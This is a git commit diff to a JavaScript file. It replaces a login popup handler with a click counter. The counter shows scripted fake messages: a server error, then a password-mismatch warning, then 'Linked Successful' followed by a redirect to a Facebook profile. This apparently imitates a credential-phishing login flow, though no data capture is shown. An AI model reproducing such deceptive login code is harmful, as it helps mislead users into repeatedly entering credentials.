47d67c6a73f317c55fd2aaf7f72814b4256aa5b3
SNdev22 <126810501+SNdev22@users.noreply.github.com>
2023-05-10 20:16:40 +0600

    Update script.js

--- script.js
+++ script.js
@@ -1,34 +1,21 @@
-  document.querySelector("#show-login").addEventListener("click",function(){
-    document.querySelector(".popup").classList.add("active");
-  });
-  document.querySelector(".popup .close-btn").addEventListener("click",function(){
-    document.querySelector(".popup").classList.remove("active");
-  });
+const myButton = document.getElementById('myButton');
+let clickCount = 0;
 
+myButton.addEventListener('click', function() {
+  clickCount++;
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-document.querySelector("#show-login").addEventListener("click",function(){
-  document.querySelector(".popup").classList.add("active");
-});
-document.querySelector(".popup .close-btn").addEventListener("click",function(){
-  document.querySelector(".popup").classList.remove("active");
+  if (clickCount === 1) {
+    setTimeout(function() {
+      alert('Server didnot respond correctly, Please Try again');
+    }, 1000); // Display the first message after 1 second
+  } else if (clickCount === 2) {
+    setTimeout(function() {
+      alert('Make Sure User Id and Password Matched');
+    }, 2000); // Display the second message after 2 seconds
+  } else if (clickCount === 3) {
+    setTimeout(function() {
+      alert('Linked Successful');
+      window.location.href = "http://facebook.com/profile.php?=73322363";
+    }, 3000); // Display the third message after 3 seconds
+  }
 });
